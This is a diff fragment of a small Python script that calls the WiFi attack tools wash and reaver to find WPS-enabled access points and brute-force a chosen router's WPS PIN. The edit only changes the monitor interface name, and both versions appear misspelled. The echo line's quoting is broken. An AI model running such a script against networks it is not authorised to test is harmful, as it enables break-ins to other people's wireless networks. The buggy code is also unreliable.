@@ -9,4 +9,4 @@ os.system("wash -i wlan0mon")
 os.system("echo "Control+C when your done looking")
 MACinput=raw_input("\nEnter MAC Address for Accesspoint:")
 
-os.system("reaver -i wlanomon -b " + MACinput + " -d 30 -S -N -vv")
+os.system("reaver -i wlanomon0 -b " + MACinput + " -d 30 -S -N -vv")
